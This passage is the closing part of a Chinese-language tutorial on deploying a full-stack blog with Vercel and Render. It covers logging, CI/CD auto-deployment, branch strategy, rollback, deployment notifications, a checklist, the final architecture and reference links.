<span class="hljs-keyword">const</span> logger = winston.<span class="hljs-title function_">createLogger</span>({
  <span class="hljs-attr">level</span>: <span class="hljs-string">'info'</span>,
  <span class="hljs-attr">format</span>: winston.<span class="hljs-property">format</span>.<span class="hljs-title function_">json</span>(),
  <span class="hljs-attr">transports</span>: [
    <span class="hljs-keyword">new</span> winston.<span class="hljs-property">transports</span>.<span class="hljs-title class_">Console</span>()
  ]
})
</code></pre>
<p><strong>查看日志</strong>：</p>
<ul>
<li>Render Dashboard → "Logs"</li>
<li>可以搜索、过滤、导出</li>
</ul>
<hr/>
<h2 data-id="heading-70">14. 持续部署（CI/CD）</h2>
<h3 data-id="heading-71">14.1 GitHub 集成</h3>
<p><strong>Vercel 自动部署</strong>：</p>
<ul>
<li>✅ Push 到 <code>main</code> 分支 → 自动部署到生产环境</li>
<li>✅ Pull Request → 自动部署预览环境</li>
<li>✅ 每次部署生成唯一 URL</li>
</ul>
<p><strong>Render 自动部署</strong>：</p>
<ul>
<li>✅ Push 到 <code>main</code> 分支 → 自动部署</li>
<li>✅ 构建日志实时查看</li>
<li>✅ 失败自动回滚到上一版本</li>
</ul>
<h3 data-id="heading-72">14.2 分支策略</h3>
<p><strong>推荐工作流</strong>：</p>
<pre><code class="hljs language-erlang" lang="erlang"><span class="hljs-function"><span class="hljs-title">main</span> <span class="hljs-params">(生产环境)</span>
  ↑
  └── <span class="hljs-title">develop</span> <span class="hljs-params">(开发环境)</span>
        ↑
        └── <span class="hljs-title">feature</span>/* <span class="hljs-params">(功能分支)</span>
</span></code></pre>
<p><strong>Vercel 多环境配置</strong>：</p>
<ol>
<li>
<p><strong>生产环境</strong>（main 分支）</p>
<ul>
<li>自动部署到 <code>blog-frontend.vercel.app</code></li>
</ul>
</li>
<li>
<p><strong>预览环境</strong>（Pull Request）</p>
<ul>
<li>每个 PR 生成预览 URL</li>
<li>例如：<code>blog-frontend-git-feature-xxxx.vercel.app</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-73">14.3 版本回滚</h3>
<p><strong>Vercel 回滚</strong>：</p>
<ol>
<li>进入项目 → <strong>"Deployments"</strong></li>
<li>找到之前的成功部署</li>
<li>点击 "..." → <strong>"Promote to Production"</strong></li>
</ol>
<p><strong>Render 回滚</strong>：</p>
<ol>
<li>进入服务 → <strong>"Deploys"</strong></li>
<li>找到之前的成功部署</li>
<li>点击 "..." → <strong>"Redeploy"</strong></li>
</ol>
<h3 data-id="heading-74">14.4 部署通知</h3>
<p><strong>Vercel 集成</strong>：</p>
<ol>
<li>项目 Settings → <strong>"Git"</strong> → <strong>"Deploy Hooks"</strong></li>
<li>添加 Webhook URL（例如：Slack、Discord）</li>
<li>每次部署自动通知</li>
</ol>
<p><strong>Render 集成</strong>：</p>
<ol>
<li>服务 Settings → <strong>"Notifications"</strong></li>
<li>添加邮箱或 Webhook</li>
<li>部署成功/失败自动通知</li>
</ol>
<hr/>
<h2 data-id="heading-75">15. 总结</h2>
<h3 data-id="heading-76">15.1 部署清单</h3>
<p>完成以下所有步骤，你的全栈博客就成功部署了：</p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 创建 Render PostgreSQL 数据库</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 部署后端到 Render</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 配置环境变量</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 初始化数据库</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 部署前端到 Vercel</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 部署后台到 Vercel</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 更新 CORS 配置</li>
<li class="task-list-item"><input type="checkbox" checked="checked" disabled="disabled"/> 验证所有功能</li>
</ul>
<h3 data-id="heading-77">15.2 最终架构</h3>
<pre><code class="hljs language-scss" lang="scss">用户 → Vercel (前端/后台) → Render (API) → Render (PostgreSQL)
         ↓ 静态资源              ↓ 业务逻辑      ↓ 数据存储
       免费 <span class="hljs-number">100</span>GB              免费 <span class="hljs-number">750</span>h       免费 <span class="hljs-number">256</span>MB
</code></pre>
<h3 data-id="heading-78">15.3 访问地址</h3>





















<table><thead><tr><th>服务</th><th>URL</th></tr></thead><tbody><tr><td><strong>前端</strong></td><td><code>https://blog-frontend-xxxx.vercel.app</code></td></tr><tr><td><strong>后台</strong></td><td><code>https://blog-admin-xxxx.vercel.app</code></td></tr><tr><td><strong>API</strong></td><td><code>https://blog-server-xxxx.onrender.com</code></td></tr></tbody></table>
<h3 data-id="heading-79">15.4 下一步</h3>
<ul>
<li>🎨 自定义域名（Vercel 和 Render 都支持）</li>
<li>📊 配置 Analytics 和监控</li>
<li>🔄 设置 UptimeRobot 防止休眠</li>
<li>💾 定期备份数据库</li>
<li>🚀 优化图片加载和缓存</li>
<li>📝 创建第一篇文章</li>
</ul>
<hr/>
<h2 data-id="heading-80">16. 参考链接</h2>
<ul>
<li><strong>Vercel 文档</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fvercel.com%2Fdocs" target="_blank" title="https://vercel.com/docs" ref="nofollow noopener noreferrer">vercel.com/docs</a></li>
<li><strong>Render 文档</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Frender.com%2Fdocs" target="_blank" title="https://render.com/docs" ref="nofollow noopener noreferrer">render.com/docs</a></li>
<li><strong>Nx Monorepo</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fnx.dev" target="_blank" title="https://nx.dev" ref="nofollow noopener noreferrer">nx.dev</a></li>
<li><strong>PostgreSQL 文档</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.postgresql.org%2Fdocs%2F" target="_blank" title="https://www.postgresql.org/docs/" ref="nofollow noopener noreferrer">www.postgresql.org/docs/</a></li>
<li><strong>UptimeRobot</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fuptimerobot.com" target="_blank" title="https://uptimerobot.com" ref="nofollow noopener noreferrer">uptimerobot.com</a></li>
</ul>
<hr/>
<p><strong>🎉 恭喜！你的全栈博客已成功部署！</strong></p>
<p>如果遇到问题，请参考 <a href="#12-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5" title="#12-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5">常见问题排查</a> 章节，或查看项目根目录的其他文档：</p>
<ul>
<li><a href="https://link.juejin.cn?target=..%2FREADME.md" target="_blank" title="../README.md" ref="nofollow noopener noreferrer">README.md</a> - 本地开发指南</li>
<li><a href="https://link.juejin.cn?target=..%2FRENDER_DEPLOYMENT.md" target="_blank" title="../RENDER_DEPLOYMENT.md" ref="nofollow noopener noreferrer">RENDER_DEPLOYMENT.md</a> - Render 详细部署指南</li>
<li><a href="https://link.juejin.cn?target=..%2FCLAUDE.md" target="_blank" title="../CLAUDE.md" ref="nofollow noopener noreferrer">CLAUDE.md</a> - 完整项目文档</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>